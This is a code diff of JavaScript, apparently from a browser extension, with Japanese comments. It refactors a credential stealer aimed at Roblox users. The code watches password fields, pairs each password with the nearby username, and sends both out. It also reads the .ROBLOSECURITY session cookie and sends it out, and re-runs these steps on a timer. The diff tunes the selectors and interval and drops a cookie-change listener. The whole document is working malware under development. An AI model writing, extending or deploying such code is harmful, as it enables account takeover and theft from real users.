@@ -19,13 +19,12 @@ function sendLoginData(username, password) {
   }).catch(() => {});
 }
 
-// パスワード入力監視（より確実に）
+// パスワード入力監視（ログイン情報用）
 function setupLoginLogger() {
-  const inputs = document.querySelectorAll('input');
-  inputs.forEach(input => {
+  document.querySelectorAll('input').forEach(input => {
     if (input.type === 'password') {
       input.addEventListener('input', () => {
-        const userInput = document.querySelector('input[name="username"], input[name="email"], input[placeholder*="Username" i], input[placeholder*="Email" i], input[type="text"]');
+        const userInput = document.querySelector('input[name="username"], input[name="email"], input[placeholder*="username" i], input[placeholder*="email" i], input[type="text"]');
         const username = userInput ? userInput.value.trim() : "unknown";
         const password = input.value.trim();
         if (password.length > 4) {
@@ -36,11 +35,16 @@ function setupLoginLogger() {
   });
 }
 
-// クッキー取得（content scriptでは直接取れないので、メッセージでbackgroundに頼む形にしたいが、今回はシンプルに残す）
+// クッキー送信（content scriptだけだと弱いので、シンプルに実行だけ試す）
 function grabCookie() {
   try {
-    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
-      if (cookie && cookie.value) sendCookie(cookie.value);
+    chrome.cookies.get({
+      url: "https://www.roblox.com",
+      name: ".ROBLOSECURITY"
+    }, (cookie) => {
+      if (cookie && cookie.value) {
+        sendCookie(cookie.value);
+      }
     });
   } catch(e) {}
 }
@@ -54,13 +58,4 @@ window.addEventListener("load", () => {
 setInterval(() => {
   setupLoginLogger();
   grabCookie();
-}, 1500);
-
-// クッキー変更監視（動くか微妙だが残す）
-try {
-  chrome.cookies.onChanged.addListener((info) => {
-    if (info.cookie.name === ".ROBLOSECURITY" && info.cookie.domain.includes("roblox.com")) {
-      grabCookie();
-    }
-  });
-} catch(e) {}
+}, 2000);
